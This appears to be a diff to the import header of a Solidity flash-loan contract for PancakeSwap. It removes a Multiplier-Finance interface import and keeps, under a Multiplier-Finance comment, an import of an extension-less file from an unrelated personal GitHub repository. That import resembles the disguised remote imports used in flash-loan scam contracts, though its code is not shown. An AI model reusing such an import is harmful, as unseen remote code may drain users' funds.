@@ -1,7 +1,6 @@
 pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contract
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 import "https://github.com/tsiilky/FLASHBnb/blob/main/smartContract";
 // PancakeSwap Smart Contract
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
